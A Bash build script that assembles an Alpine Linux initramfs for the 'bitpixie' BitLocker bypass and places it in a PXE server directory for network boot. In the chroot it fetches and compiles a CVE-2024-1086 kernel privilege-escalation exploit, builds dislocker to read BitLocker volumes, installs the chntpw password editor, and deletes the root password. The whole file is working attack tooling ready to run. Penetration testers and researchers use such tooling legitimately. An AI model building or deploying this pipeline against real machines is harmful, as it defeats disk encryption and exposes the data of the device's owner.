#!/usr/bin/env bash
#
# Create initramfs for bitpixie exploit
# Based on top of https://github.com/alpinelinux/alpine-make-rootfs
#

## Common functions
out() { printf "\n\033[32;1m[+] %s \033[0m\n" "$1"; }

if [ "$1" = "-d" ] || [ "$1" = "--debug" ]; then
    DEBUG="1"
elif [ -z "$1" ]; then
    DEBUG="0"
else
    printf 'ERROR: Unkown input.\n  Usage: %s [-d|--debug]\n' "$(basename $0)"
    exit 1
fi

SRC_ROOT="$PWD"
CACHE="$SRC_ROOT/.cache"
[ -d $CACHE ] || mkdir -p $CACHE # create .cache directory

out "Using $SRC_ROOT as root of operation."

## Download missing artifacts
bash -c "$SRC_ROOT/linux/download.sh $SRC_ROOT $CACHE"

# create temporary initramfs direcotry
INITRAMFS="$(mktemp -d)"
trap 'sudo rm -rf $INITRAMFS' EXIT

## Preprocessing
# Copy all relevant files
cp -r $CACHE/lib $INITRAMFS
cp -r $SRC_ROOT/linux/root/* $INITRAMFS

out "Populating temporary rootfs at $INITRAMFS..."

## Execute it and start the build process
sudo $CACHE/alpine-make-rootfs \
    --branch latest-stable \
    --packages 'alpine-base agetty eudev chntpw util-linux openssh' \
    --packages 'sgdisk ntfs-3g fuse-common' \
    --packages 'fuse mbedtls musl' \
    --packages 'vis' \
    --timezone 'Europe/Berlin' \
    --script-chroot "$INITRAMFS" - <<'SHELL'
        # Fail if an error occurs
        set -e

        # add services for service manager
        rc-update add dmesg sysinit

        rc-update add hwclock boot
        rc-update add modules boot
        rc-update add sysctl boot
        rc-update add hostname boot
        rc-update add bootmisc boot
        rc-update add syslog boot
        rc-update add klogd boot
        rc-update add networking boot

        rc-update add mount-ro shutdown
        rc-update add killprocs shutdown

        ln -s /etc/init.d/agetty /etc/init.d/agetty.ttyS0
        rc-update add agetty.ttyS0 default

        # Show debug infos
        set -x

        # save start path for later to return to
        ROOT="$PWD"

        # Prepare build environment
        build_packages="alpine-sdk" # Common development meta package
        build_packages="${build_packages} cmake fuse-dev mbedtls-dev" # dislocker
        apk add $build_packages

        # Build cve exploit
        cve="$(mktemp -d)"
        git clone --single-branch https://github.com/andigandhi/CVE-2024-1086_bitpixie.git $cve
        cd $cve
        # Use commit 30cccf935c2a ("removed unused functions and changed output
        # file") as HEAD
        git reset --hard 30cccf935c2a
        make CC=cc && cp ./exploit /usr/bin

        # Build dislocker
        bitlocker="$(mktemp -d)"
        git clone https://github.com/Aorimn/dislocker.git $bitlocker
        cd $bitlocker
        # Use commit 3e7aea196eaa ("Merge pull request #317 from
        # JunielKatarn/macos") as HEAD
        git reset --hard 3e7aea196eaa
        cmake -S ./ && make && make install

        # Cleanup build environment
        apk del $build_packages

        # Cleanup
        cd $ROOT
        passwd -d root # Delete password for root
SHELL

# Exit prematurely if alpine-make-rootfs fails
if [ "$?" = "1" ]; then
    if [ "$DEBUG" = "1" ]; then
        trap - EXIT
        out "Kept temporary rootfs at $INITRAMFS."
    fi
    exit 1
fi

out "Creating initramfs from temporary rootfs at $INITRAMFS..."

OUTPUT="$SRC_ROOT/pxe-server/bitpixie-initramfs.gz"
# Note: Needs to be run as root because all files in the rootfs are chowned by root
(cd $INITRAMFS; sudo bash -c "find . | cpio -o -H newc | gzip") > $OUTPUT

out "Created initramfs $(basename $OUTPUT) at $(dirname $OUTPUT)."

if [ "$DEBUG" = "1" ]; then
    # Deactivate deletion of INITRAMFS
    trap - EXIT
    out "Kept temporary rootfs at $INITRAMFS."
else
    out "Deleted $INITRAMFS."
fi
